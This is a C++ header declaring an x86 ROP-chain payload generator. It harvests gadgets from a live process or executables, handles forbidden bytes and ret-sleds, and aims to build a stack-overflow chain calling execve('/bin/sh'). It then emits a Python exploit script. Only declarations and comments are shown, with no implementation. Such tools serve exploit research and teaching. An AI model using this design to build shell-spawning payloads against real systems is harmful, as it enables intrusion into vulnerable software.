#ifndef PAYLOAD_GEN_X86_H
#define PAYLOAD_GEN_X86_H

#include <functional>
#include <map>
#include <set>
#include <string>
#include <vector>

#include <capstone/capstone.h>
#include "common/types.hpp"
#include "VirtualMemoryInstructions.hpp"


// Forward declarations for friend functions.
void testPayloadGeneration();


namespace ROP {

    // An object of this class will be used for generating an attack payload
    // for the given target process or executables.
    // The class is specialized for the x86 architecture.
    class PayloadGenX86 {
        VirtualMemoryInstructions vmInstructionsObject;
        std::vector< std::pair<addressType, std::vector<std::string>> > instrSeqs;
        std::map<std::string, std::vector<unsigned>> firstInstrToSequenceIndexes;
        std::vector< std::vector<RegisterInfo> > regInfoSeqs;
        /**
         * Indexes into `instrSeqs` and `regInfoSeqs`.
         * We use this in order to be able to do sorting and filtering.
         */
        std::vector<unsigned> sequenceIndexList;
        /**
         * An index into `instrSeqs` for a valid "ret" instruction sequence
         * (a sequence with just one "ret" instruction).
         * If an index for a valid sequence is not found
         * (no "ret" instructions at all or they all have forbidden bytes),
         * then the value is `this->instrSeqs.size()`.
         */
        unsigned indexValidRetInstrSeq;
        /**
         * An index into `instrSeqs` for a valid "int 0x80" / "syscall" instruction sequence.
         * If an index for a valid sequence is not found
         * (can't find the instructions at all or they all have forbidden bytes),
         * then the value is `this->instrSeqs.size()`.
         */
        unsigned indexValidSyscallInstrSeq;

        BitSizeClass processArchSize;
        // How many bytes a register has for the current architecture size. 4 or 8.
        unsigned registerByteSize;

        /**
         * Example on 64bit Linux:
         * `syscallArgNumberToRegKey[0]` = X86_REG_RAX.
         * `syscallArgNumberToRegKey[1]` = X86_REG_RDI.
         * Example on 32bit Linux:
         * `syscallArgNumberToRegKey[0]` = X86_REG_RAX.
         * `syscallArgNumberToRegKey[1]` = X86_REG_RBX.
         * Note: Register keys are always 64bit register identifiers.
         *  */
        std::vector<x86_reg> syscallArgNumberToRegKey;


        /**
         * Register keys that can be used as working registers during our gadgets.
         * Example: X86_REG_RAX, X86_REG_RBX.
         */
        std::set<x86_reg> usableRegKeys;

        /**
         * Example on 64bit:
         * `regKeyToMainReg[X86_REG_RAX]` = X86_REG_RAX.
         * Example on 32bit:
         * `regKeyToMainReg[X86_REG_RAX]` = X86_REG_EAX.
         * Note: The map is always keyed by the 64bit reg identifiers, not the 32bit ones.
         */
        std::map<x86_reg, x86_reg> regKeyToMainReg;

        /**
         * Example on 64bit:
         * `regKeyToPartialRegs[X86_REG_RAX]` = {_RAX, _EAX, _AX, _AH, _AL}.
         * Example on 32bit:
         * `regKeyToPartialRegs[X86_REG_RAX]` = {_EAX, _AX, _AH, _AL}.
         * Note: The map is always keyed by the 64bit reg identifiers, not the 32bit ones.
         */
        std::map<x86_reg, std::set<x86_reg>> regKeyToPartialRegs;

        /**
         * Example on 64bit:
         * `regKeyToEndingPartialRegs[X86_REG_RAX]` = {_RAX, _EAX, _AX, _AL}, but not _AH.
         * Example on 32bit:
         * `regKeyToEndingPartialRegs[X86_REG_RAX]` = {_EAX, _AX, _AL}, but not _AH.
         * Note: The map is always keyed by the 64bit reg identifiers, not the 32bit ones.
         */
        std::map<x86_reg, std::set<x86_reg>> regKeyToEndingPartialRegs;

        /**
         * Example:
         * stackPointerIncreaseInstructionToOffset["pop rcx"] = 8;
         * stackPointerIncreaseInstructionToOffset["pop ecx"] = 4;
         * stackPointerIncreaseInstructionToOffset["pop cx"] = 2;
         * stackPointerIncreaseInstructionToOffset["add rsp, 0x20"] = 32;
         * stackPointerIncreaseInstructionToOffset["add esp, 0x6"] = 6;
         * stackPointerIncreaseInstructionToOffset["add sp, 0xff"] = 255;
         * stackPointerIncreaseInstructionToOffset["inc esp"] = 1;
         * @note
         * Instructions that pop the stack pointer (e.g. "pop rsp")
         * are intentionally excluded from this map.
         */
        std::map<std::string, unsigned> stackPointerIncreaseInstructionToOffset;


        void loadTheSyscallArgNumberMap();
        void loadTheRegisterMaps();
        void loadTheStackPointerInstructionToOffsetMap();
        void computeRelevantSequenceIndexes();
        void addPythonScriptPrelude();


        byteSequence payloadBytes = {};
        std::vector<std::string> pythonScript = {};
        unsigned int currLineIndent = 0;
        bool currScriptLineIsComment = false;

        public:
        /**
         * Get loadable segment bytes by reading the "/proc/PID/maps" file
         * and then loading segments from each ELF file according to the mapping.
         */
        PayloadGenX86(int processPid);

        /**
         * Get loadable segments from each given executable path.
         * @param execPaths Paths to executable files.
         * @param baseAddresses Values that will be used, in order, as a base address for each executable file.
         *                      If this array is empty or has fewer addresses than the total number of files,
         *                      then the value 0 will be used as a default.
         */
        PayloadGenX86(const std::vector<std::string> execPaths,
                      const std::vector<addressType> baseAddresses);

        private:

        unsigned getNumberOfVariantsToOutputForThisStep(unsigned numFoundVariants);

        bool registerSizedValueIsFreeOfForbiddenBytes(uint64_t cValue);

        addressType findValidVirtualMemoryAddressOfString(const char * const cStr);
        addressType findValidVirtualMemoryAddressOfBytes(const byteSequence& bytes);


        /**
         * Add the given line to the Python script,
         * taking into account indentation and comment-status.
         */
        void addLineToPythonScript(const std::string& line);

        /**
         * Takes the information from the instruction sequence at the given index
         * and appends it to the payload bytes and to the payload script.
         */
        void appendInstructionSequenceToPayload(unsigned sequenceIndex);

        /**
         * Takes the the bytes from the given value
         * and appends them to the payload bytes and to the payload script.
         */
        void appendBytesOfRegisterSizedConstantToPayload(const uint64_t cValue);

        /**
         * Appends a total number of `numPaddingBytes` padding bytes with value `0xFF`
         * to the payload bytes and to the payload script.
         */
        void appendPaddingBytesToPayload(const unsigned numPaddingBytes);

        /**
         * Appends the virtual memory address of a "ret" instruction (many times)
         * to the payload bytes in order to cover at least `minByteSizeToCover` bytes in the payload.
         * If the CPU starts executing this, nothing happens until after the RET-sled.
         * A Ret-sled is useful for padding the beginning of the payload
         * if you don't know the exact size of the needed padding for covering the stack buffer.
         */
        void appendRetSledBytesToPayload(const unsigned minByteSizeToCover);

        /**
         * Try to perform some (payload append) operations described by the callback.
         * On failure, revert the payload bytes and script to their previous state.
         */
        bool tryAppendOperationsAndRevertOnFailure(const std::function<bool(void)>& cb);


        /**
         * Some instructions are acceptable inside an instruction sequence,
         * but it's harder to check for them so we hardcode them in this method.
         */
        bool instructionIsWhitelistedInSequence(const std::string& instruction,
                                                const RegisterInfo& regInfo);

        /**
         * The register information provided by Capstone is incorrect for a few instruction types,
         * so we hardcode in this method a few of the misconfigured instructions that we know are bad.
         */
        bool instructionIsBlacklistedInSequence(const std::string& instruction,
                                                const RegisterInfo& regInfo);

        /**
         * Check if the instruction safely increases the stack pointer.
         * E.g. "pop ebx" is safe if "ebx" is not a forbidden register.
         * @return
         * Will return `-1` if the instruction is not a safe stack pointer increase.
         * Otherwise, will return the offset by which the stack pointer is increased
         * after the given safe intruction is executed.
         */
        int instructionIsSafeStackPointerIncrease(const std::string& instruction,
                                                  const RegisterInfo& regInfo,
                                                  std::set<x86_reg> forbiddenRegisters);

        /**
         * Checks if the instruction is either `ret` or `ret imm16`.
         * @return
         * Will return `-1`, if the instruction is not a `ret`.
         * Will return `0`, if the instruction is a simple `ret` or a `ret 0x0` instruction.
         * Will return `imm16`, if the instruction is a `ret imm16` instruction.
         */
        int checkInstructionIsRetAndGetImmediateValue(const std::string& instruction,
                                                      const RegisterInfo& regInfo);


        struct SequenceLookupResult {
            // The index of the found sequence, in the sequence vector.
            unsigned index;
            // If any of the instructions in the sequence need extra padding on the stack
            // (e.g. a middle instruction is "add rsp, 0x20" or "pop rbx"), then this is the total amount of needed padding.
            unsigned numMiddlePaddingBytes;
            // If the last instruction is a "ret imm16" instruction,
            // then this is the total amount of needed padding in the payload after the current sequence.
            unsigned numReturnPaddingBytes;
        };

        /**
         * Search for an instruction sequence that starts with the given instruction.
         * Also, it checks that the rest of the instructions in the sequence don't write to
         * the given forbidden registers (or their partial registers), or access any memory region
         * (i.e. it checks that the remaining instructions are effective NOPs).
         */
        std::vector<SequenceLookupResult>
        searchForSequenceStartingWithInstruction(const std::string& targetInstruction,
                                                 const std::set<x86_reg>& forbiddenRegisterKeys);

        /**
         * Search for an instruction sequence that starts with any of the given instructions.
         * Also, it checks that the rest of the instructions in the sequence don't write to
         * the given forbidden registers (or their partial registers), or access any memory region
         * (i.e. it checks that the remaining instructions are effective NOPs).
         * Then, append the found sequence(s) to the payload bytes and script.
         * Optionally, the callback can be used to append something else to the payload
         * between the instruction sequence bytes and the padding bytes (if any).
         * @return
         * Will return `true`, if there's at least a match.
         * Will return `false`, if there isn't a match.
         */
        bool appendGadgetStartingWithInstruction(const std::vector<std::string>& targetFirstInstructionList,
                                                 std::set<x86_reg> forbiddenRegisterKeys,
                                                 const std::function<void(const std::string&)>& appendLinesAfterAddressBytesCb);

        bool appendGadgetForFinalSystemCall();


        bool appendGadgetForCopyOrExchangeRegisters(x86_reg destRegKey,
                                                    x86_reg srcRegKey,
                                                    std::set<x86_reg> forbiddenRegisterKeys,
                                                    int numAllowedIntermediates = 3,
                                                    bool isParentCall = true);

        /**
         * Search for 'pop REG' instruction sequence and
         * append the found sequence(s) to the payload bytes and script.
         */
        bool appendGadgetForAssignValueToRegister(x86_reg regKey,
                                                  uint64_t cValue,
                                                  std::set<x86_reg> forbiddenRegisterKeys,
                                                  int numAllowedIntermediates = 3,
                                                  bool isParentCall = true);

        public:

        //////////////////////// Config values ////////////////////////

        std::bitset<256> cForbiddenBytes;
        unsigned cNumForbiddenBytes; // optimization since bitset::count() might not be O(1).

        bool cIgnoreDuplicateInstructionSequenceResults = true;
        unsigned cMaxInstructionsInSequence = 10;
        unsigned cApproximateByteSizeOfStackBuffer = 100; // i.e. the payload overflows something like `char buffer[100]`.
        unsigned cNumVariantsToOutputForEachStep = 1; // Set to `0` for "All of them".
        unsigned cNumAcceptablePaddingBytesForOneInstrSequence = 100;

        //////////////////////// Config values ////////////////////////

        /**
         * Call this after setting the configuration fields above.
         * You must not change the configuration fields after calling this method.
         * You must call this method before trying to get any payloads.
         */
        void configureGenerator();


        /**
         * Try to build a ROP-chain that performs `execve("/bin/sh", NULL, NULL)`.
         * Passing NULL for arguments and environment is explicitly allowed for some Linux versions.
         */
        bool appendROPChainForShellCodeWithPathNullNull();

        /**
         * Try to build a ROP-chain that performs `execve("/bin/sh", {NULL}, {NULL})`.
         * The args and environment registers are assigned values that point to NULL.
         * In other words, the arguments and environment arrays are empty.
         */
        bool appendROPChainForShellCodeWithPathEmptyEmpty();

        void writePayloadToFile(const std::string& path);
        void writeScriptToFile(const std::string& path);

        public:
        // Mark these functions as friends so that they can access private members.
        friend void ::testPayloadGeneration();
    };

}


#endif // PAYLOAD_GEN_X86_H
